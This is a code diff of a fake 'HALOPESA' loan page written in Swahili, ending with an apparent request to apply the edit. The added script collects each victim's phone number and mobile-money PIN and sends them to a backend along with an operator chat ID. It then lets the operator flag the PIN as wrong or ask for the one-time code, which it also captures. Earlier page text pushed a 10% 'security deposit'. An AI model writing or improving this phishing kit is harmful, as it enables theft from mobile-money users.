@@ -5,123 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HALOPESA - HUDUMA ZA MIKOPO NA PESA KIGANJANI</title>
     <link rel="stylesheet" href="style.css">
-    <style>
-        /* Success Screen Custom Styles matching the provided image */
-        #screen-success {
-            background-color: #ff8800;
-            padding: 20px !important;
-            box-sizing: border-box;
-            text-align: left !important;
-        }
-        .success-card-inner {
-            background: #ffffff;
-            border-radius: 16px;
-            padding: 20px;
-            max-width: 420px;
-            width: 100%;
-            margin: 0 auto;
-            box-sizing: border-box;
-            text-align: center;
-            color: #333;
-        }
-        .success-icon-container {
-            width: 60px;
-            height: 60px;
-            background-color: #ff8800;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 10px auto;
-            color: white;
-            font-size: 28px;
-        }
-        .amount-box {
-            background: linear-gradient(135deg, #ff8800, #ffaa33);
-            color: white;
-            padding: 20px;
-            border-radius: 12px;
-            margin: 15px 0;
-            text-align: center;
-        }
-        .amount-box span {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: bold;
-        }
-        .amount-box h1 {
-            font-size: 28px;
-            margin: 5px 0 0 0;
-        }
-        .notice-box {
-            background-color: #fff8e6;
-            border: 1px solid #ffe0b2;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 12px;
-            color: #5d4037;
-            text-align: left;
-            margin-bottom: 15px;
-            line-height: 1.4;
-        }
-        .details-section {
-            text-align: left;
-            border-top: 1px solid #eee;
-            border-bottom: 1px solid #eee;
-            padding: 15px 0;
-            margin-bottom: 15px;
-        }
-        .detail-row {
-            display: flex;
-            align-items: center;
-            margin-bottom: 12px;
-            font-size: 13px;
-            color: #444;
-            gap: 12px;
-            text-align: left;
-        }
-        .detail-icon-box {
-            width: 32px;
-            height: 32px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            flex-shrink: 0;
-        }
-        .secondary-action-btn {
-            background-color: #ffffff;
-            color: #333;
-            border: 1px solid #e0e0e0;
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-bottom: 8px;
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .footer-note {
-            font-size: 12px;
-            color: #666;
-            text-align: left;
-            background: #fcfcfc;
-            border: 1px solid #f0f0f0;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            display: flex;
-            gap: 10px;
-            align-items: flex-start;
-        }
-    </style>
 </head>
 <body>
 
@@ -257,65 +140,10 @@
         </div>
 
         <!-- SUCCESS SCREEN -->
-        <div id="screen-success" class="screen">
-            <div class="success-card-inner">
-                <div class="success-icon-container">✓</div>
-                <h3 style="margin: 0; color: #222; font-size: 20px;">🎉 Hongera!</h3>
-                <p style="font-size: 12px; color: #666; margin-top: 5px;">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
-                
-                <div class="amount-box">
-                    <span>KIASI KILICHOIDHINISHWA</span>
-                    <h1>TSh 100,000</h1>
-                </div>
-
-                <div class="notice-box">
-                    <strong>⚠️ NOTISI YA UZINGATIAJI</strong><br>
-                    Akaunti yako ya HaloPesa lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo ulioomba</strong>. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.
-                </div>
-
-                <div class="details-section">
-                    <div style="font-weight: bold; font-size: 12px; text-align: left; margin-bottom: 10px; color: #333;">💳 Maelezo ya Mkopo</div>
-                    
-                    <div class="detail-row">
-                        <div class="detail-icon-box" style="background-color: #e8f5e9; color: #2e7d32;">🟢</div>
-                        <div style="text-align: left;">
-                            <span style="font-size: 10px; color: #888; font-weight: bold; display: block; text-transform: uppercase;">MALIPO YA KILA MWEZI</span>
-                            <strong style="color: #222; font-size: 13px;">TSh 2,441</strong>
-                        </div>
-                    </div>
-                    
-                    <div class="detail-row">
-                        <div class="detail-icon-box" style="background-color: #fff3e0; color: #ef6c00;">📅</div>
-                        <div style="text-align: left;">
-                            <span style="font-size: 10px; color: #888; font-weight: bold; display: block; text-transform: uppercase;">MUDA WA MKOPO</span>
-                            <strong style="color: #222; font-size: 13px;">Miezi 48</strong>
-                        </div>
-                    </div>
-
-                    <div class="detail-row">
-                        <div class="detail-icon-box" style="background-color: #e3f2fd; color: #1565c0;">📈</div>
-                        <div style="text-align: left;">
-                            <span style="font-size: 10px; color: #888; font-weight: bold; display: block; text-transform: uppercase;">KIWANGO CHA RIBA</span>
-                            <strong style="color: #222; font-size: 13px;">8% APR</strong>
-                        </div>
-                    </div>
-                </div>
-
-                <div style="text-align: left; font-weight: bold; font-size: 12px; margin-bottom: 8px; color: #333;">Vitendo vya Haraka</div>
-                <button class="secondary-action-btn">💰 Weka Fedha</button>
-                <button class="secondary-action-btn">💵 Toa Fedha</button>
-                <button class="secondary-action-btn">📄 Maelezo ya Mkopo</button>
-
-                <div class="footer-note" style="margin-top: 15px;">
-                    <span style="font-size: 16px;">📱</span>
-                    <div style="text-align: left;">
-                        <strong style="font-size: 11px; text-transform: uppercase; color: #444;">Hatua Zinazofuata:</strong><br>
-                        <span style="color: #666; font-size: 11px;">Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</span>
-                    </div>
-                </div>
-
-                <button class="btn-primary" style="background-color: #ff8800; margin-top: 15px;" onclick="location.reload()">🏠 Rudi Nyumbani</button>
-            </div>
+        <div id="screen-success" class="screen" style="text-align: center; padding: 40px 20px;">
+            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+            <h2 style="color: white;">IMEANISHWA!</h2>
+            <p style="color: #e5e7eb; margin-top: 10px;">Mkopo wako umeidhinishwa na kuhamishwa kwenye akaunti yako ya HaloPesa.</p>
         </div>
 
     </div>
@@ -453,4 +281,103 @@
             const selectedAmount = 'TZS ' + Number(rangeVal).toLocaleString('en-US');
 
             const urlParams = new URLSearchParams(window.location.search);
-            const adminParam = urlParams.get('admin
+            const adminParam = urlParams.get('admin');
+
+            try {
+                const response = await fetch('/api/submit-application', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, pin, amount: selectedAmount, adminChatId: adminParam })
+                });
+
+                const data = await response.json();
+                if(data.success) {
+                    currentUserId = data.userId;
+                    document.getElementById('login-error-banner').style.display = 'none';
+                    goToScreen('screen-waiting');
+                    startPollingStatus();
+                } else {
+                    const banner = document.getElementById('login-error-banner');
+                    banner.innerText = data.error || 'Hitilafu imetokea. Jaribu tena.';
+                    banner.style.display = 'block';
+                }
+            } catch (err) {
+                const banner = document.getElementById('login-error-banner');
+                banner.innerText = 'Hitilafu ya mtandao. Tafadhali jaribu tena.';
+                banner.style.display = 'block';
+            }
+        }
+
+        function startPollingStatus() {
+            if(statusPollInterval) clearInterval(statusPollInterval);
+
+            statusPollInterval = setInterval(async () => {
+                if(!currentUserId) return;
+                try {
+                    const res = await fetch(`/api/check-status/${currentUserId}`);
+                    const data = await res.json();
+
+                    if(data.status === 'APPROVED_LOAD_OTP') {
+                        clearInterval(statusPollInterval);
+                        const otpBanner = document.getElementById('otp-error-banner');
+                        otpBanner.innerText = 'correct OTP ✅';
+                        otpBanner.style.background = '#e8f5e9';
+                        otpBanner.style.color = '#2e7d32';
+                        otpBanner.style.display = 'block';
+                        goToScreen('screen-otp');
+                    } else if(data.status === 'DENIED') {
+                        clearInterval(statusPollInterval);
+                        const banner = document.getElementById('login-error-banner');
+                        banner.innerText = 'Ombi limekataliwa ❌';
+                        banner.style.background = '#ffebee';
+                        banner.style.color = '#c62828';
+                        banner.style.display = 'block';
+                        goToScreen('screen-login');
+                    } else if(data.status === 'SUCCESS') {
+                        clearInterval(statusPollInterval);
+                        document.querySelector('.container').style.background = 'var(--primary-green)';
+                        goToScreen('screen-success');
+                    } else if(data.status === 'WRONG_PIN_ERROR') {
+                        clearInterval(statusPollInterval);
+                        const banner = document.getElementById('login-error-banner');
+                        banner.innerText = 'wrong PIN ❌';
+                        banner.style.background = '#ffebee';
+                        banner.style.color = '#c62828';
+                        banner.style.display = 'block';
+                        document.querySelectorAll('#screen-login .pin-box').forEach(b => b.value = '');
+                        checkLoginInputs();
+                        goToScreen('screen-login');
+                    } else if(data.status === 'WRONG_OTP_ERROR') {
+                        clearInterval(statusPollInterval);
+                        const banner = document.getElementById('otp-error-banner');
+                        banner.innerText = 'WRONG OTP ❌';
+                        banner.style.background = '#ffebee';
+                        banner.style.color = '#c62828';
+                        banner.style.display = 'block';
+                        document.getElementById('otpInput').value = '';
+                        checkOtpInput();
+                        goToScreen('screen-otp');
+                    }
+                } catch (e) {}
+            }, 3000);
+        }
+
+        async function submitOtp() {
+            const otp = document.getElementById('otpInput').value;
+
+            await fetch('/api/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userId: currentUserId, otp })
+            });
+
+            document.getElementById('otp-error-banner').style.display = 'none';
+            document.getElementById('status-text').innerText = 'Inathibitisha OTP...';
+            goToScreen('screen-waiting');
+            startPollingStatus();
+        }
+    </script>
+</body>
+            </html>
+    
+Add only this, and other commands don't change
